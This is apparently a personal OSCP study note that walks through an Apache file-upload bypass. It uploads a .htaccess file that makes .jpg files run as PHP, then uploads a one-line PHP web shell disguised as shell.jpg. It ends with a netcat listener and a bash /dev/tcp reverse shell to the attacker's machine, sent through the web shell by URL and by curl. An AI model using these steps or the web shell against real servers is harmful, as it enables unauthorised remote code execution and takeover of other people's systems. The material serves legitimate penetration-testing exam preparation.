# .htaccess Bypass — PHP Execution via File Upload (OSCP)

## What This Is

When a web server runs Apache, a `.htaccess` file in a directory controls how that directory behaves.
If you can upload a `.htaccess` file, you can **redefine what file types get executed as PHP**.

This bypasses upload filters that block `.php` files directly.

---

## When to Use This

Use this technique when:
- You found an `/uploads/` directory (or similar)
- You can upload files to it
- `.php` files are blocked by the upload filter
- Other extensions like `.jpg`, `.txt`, or `.png` are allowed
- The directory is accessible via the browser (files are served, not just stored)
- The web server is **Apache** (this is Apache-specific)

---

## Step 1 — Create the .htaccess File

```bash
nano .htaccess
```

Paste this inside:
```apache
AddType application/x-httpd-php .jpg
```

This tells Apache: "treat `.jpg` files as PHP and execute them."

Save with `Ctrl+O → Enter`, exit with `Ctrl+X`.

---

## Step 2 — Upload .htaccess

Use the web app's upload feature to upload `.htaccess`.

---

## Step 3 — Create the Web Shell

```bash
nano shell.jpg
```

Paste this inside:
```php
<?php system($_GET['cmd']); ?>
```

Save and exit.

Verify it's plain text (not an actual image):
```bash
file shell.jpg
```

Expected output:
```
shell.jpg: PHP script, ASCII text
```

---

## Step 4 — Upload shell.jpg

Use the upload feature to upload `shell.jpg`.

---

## Step 5 — Trigger Execution

Visit in browser:
```
http://<TARGET>/uploads/shell.jpg?cmd=whoami
```

If you see command output → **you have Remote Code Execution (RCE)**.

---

## Step 6 — Get a Reverse Shell

Start your listener on Kali:
```bash
nc -lvnp 443
```

Trigger a reverse shell via the web shell:
```
http://<TARGET>/uploads/shell.jpg?cmd=bash+-i+>%26+/dev/tcp/<KALI_IP>/443+0>%261
```

Or URL-encode it properly and use curl:
```bash
curl "http://<TARGET>/uploads/shell.jpg?cmd=bash%20-i%20>%26%20/dev/tcp/<KALI_IP>/443%200>%261"
```

---

## Related Notes

- [[HTA_Files]]
- [[Web_Enum]]
- [[Msfvenom]]
- [[Netcat]]
